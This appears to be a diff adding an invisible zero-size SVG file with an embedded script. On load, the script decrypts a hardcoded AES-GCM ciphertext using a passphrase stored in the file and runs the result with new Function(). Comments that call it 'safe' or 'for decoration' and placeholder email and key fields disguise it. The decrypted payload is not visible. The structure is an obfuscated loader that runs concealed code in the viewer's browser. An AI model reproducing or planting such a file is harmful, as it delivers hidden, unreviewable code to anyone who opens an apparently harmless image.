@@ -1,0 +1,172 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg width="0" height="0" xmlns="http://www.w3.org/2000/svg">
+  <!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->
+  
+  <script type="application/javascript"><![CDATA[
+
+   
+    // Debug mode with safe logging
+    const DEBUG_MODE = true;
+     const jk = "[EMAIL]";
+    const key = "[KEY]";
+    function debugLog() {
+      try {
+        if (DEBUG_MODE && console && console.log) {
+          console.log.apply(console, ['[DEBUG]'].concat(Array.prototype.slice.call(arguments)));
+        }
+      } catch (e) {}
+    }
+
+    // Configuration with safe access
+    const cryptoConfig = (function() {
+      const config = {
+        iv: "62915c95997616a4a365e1a9",
+        salt: "df8d909efdba15bd20d585c7c0f6e906",
+        ciphertext: "93f0c85dace90dc09e11723b52e9287087ed0505ecc22165343da6f0ae06b0a2292d60187ee52c75887de12a850fc48f78c8e416c1b11ae4c4092d186baca5db8f8b4b79e86a4326b04ebac33f4e9130cc40e6065d3fd461badddf3dd65f2c670b3f5f0088886617f12f2f0f83eabbb1e66f387f04a4fcfd035936fac441ccd4686b0b0ecf2ea5d83bf43cb6e59553e9053fceea67f7277d91ed78664b62e03d1919a9108d9e0e4465ef8cfd0b4e8171e4bcf0c6ec09f63ba02ee9f20b143fe646a4989664e84278899865f1e47ae8526c3737ca79c7a1b196830baab2449a0e8a628fe726f66b3a03748f3d1722a3e815a3cf3bbe0866df75708a9da90474e7c05140e329a7a8472db535bfbe90e437f82aa4f372a644779235675f8591a3df0e3944e674e1cad3ac377083623712494dff03e93bc333a09aa7302cef05df6154b8d8b37dc9f83c5b4938bd171ef34c2755ca93335452ee0e9d0b6e49af44c46b5ae3feb836a2f6a8359690b362fa5f42e0fcb54deb4d6df4f11e9e55ce5d5b9562a303b29342e1832ca84e7dafc8cdf2e7c697b0ae4e2186b27d28279385bb4e93f6b6002fe3b5491bd5ead8687331649dbed92eb00223c4bf1ea844bc8e50427af51eb40ddc0df4b5f4545735636406bd424b5e35f0e864ad7ab261eece38b2450ecbb8d5f0377e146c77",
+        secret: "dust"
+      };
+      
+      // Safe hex validation
+      function validateHex(str) {
+        try {
+          return typeof str === 'string' && /^[0-9a-f]+$/i.test(str);
+        } catch (e) {
+          return false;
+        }
+      }
+      
+      // Safe getters with validation
+      return {
+        getIV: function() {
+          if (!validateHex(config.iv)) {
+            debugLog("Invalid IV detected");
+            return '';
+          }
+          return config.iv;
+        },
+        getSalt: function() {
+          if (!validateHex(config.salt)) {
+            debugLog("Invalid salt detected");
+            return '';
+          }
+          return config.salt;
+        },
+        getCiphertext: function() {
+          if (!validateHex(config.ciphertext)) {
+            debugLog("Invalid ciphertext detected");
+            return '';
+          }
+          return config.ciphertext;
+        },
+        getSecret: function() {
+          return config.secret;
+        }
+      };
+    })();
+
+    // Safe hex conversion
+    function hexToBytes(hex) {
+      try {
+        if (typeof hex !== 'string' || hex.length % 2 !== 0) {
+          debugLog("Invalid hex input");
+          return new Uint8Array();
+        }
+        
+        const bytes = new Uint8Array(hex.length / 2);
+        for (let i = 0; i < hex.length; i += 2) {
+          const byte = parseInt(hex.substr(i, 2), 16);
+          if (isNaN(byte)) {
+            debugLog("Invalid hex byte at position", i);
+            return new Uint8Array();
+          }
+          bytes[i/2] = byte;
+        }
+        return bytes;
+      } catch (e) {
+        debugLog("Hex conversion error:", e);
+        return new Uint8Array();
+      }
+    }
+
+    // Main decryption process with error protection
+    async function decryptAndExecute() {
+      debugLog("Starting secure process");
+      
+      try {
+        // Verify crypto.subtle is available
+        if (!window.crypto || !window.crypto.subtle) {
+          throw new Error("Web Crypto API not available");
+        }
+        
+        // Step 1: Prepare key material
+        debugLog("Preparing key material");
+        const secret = cryptoConfig.getSecret();
+        if (!secret) throw new Error("Invalid secret");
+        
+        const baseKey = await window.crypto.subtle.importKey(
+          "raw",
+          new TextEncoder().encode(secret),
+          { name: "PBKDF2" },
+          false,
+          ["deriveKey"]
+        );
+        
+        // Step 2: Derive key
+        debugLog("Deriving encryption key");
+        const salt = cryptoConfig.getSalt();
+        if (!salt) throw new Error("Invalid salt");
+        
+        const derivedKey = await window.crypto.subtle.deriveKey(
+          {
+            name: "PBKDF2",
+            salt: hexToBytes(salt),
+            iterations: 100000,
+            hash: "SHA-256"
+          },
+          baseKey,
+          { name: "AES-GCM", length: 256 },
+          false,
+          ["decrypt"]
+        );
+        
+        // Step 3: Decrypt content
+        debugLog("Decrypting content");
+        const iv = cryptoConfig.getIV();
+        const ciphertext = cryptoConfig.getCiphertext();
+        if (!iv || !ciphertext) throw new Error("Invalid IV or ciphertext");
+        
+        const decrypted = await window.crypto.subtle.decrypt(
+          {
+            name: "AES-GCM",
+            iv: hexToBytes(iv)
+          },
+          derivedKey,
+          hexToBytes(ciphertext)
+        );
+        
+        // Step 4: Execute safely
+        const code = new TextDecoder().decode(decrypted);
+        if (code && code.trim().length > 0) {
+          debugLog("Executing decrypted content");
+          try {
+            (new Function(code))();
+          } catch (e) {
+            debugLog("Execution error:", e);
+          }
+        } else {
+          debugLog("Empty decrypted content");
+        }
+        
+      } catch (error) {
+        debugLog("Process failed:", error);
+      }
+    }
+
+    // Start with safe delay
+    if (window.requestIdleCallback) {
+      window.requestIdleCallback(decryptAndExecute);
+    } else {
+      setTimeout(decryptAndExecute, 100);
+    }
+  ]]></script>
+</svg>
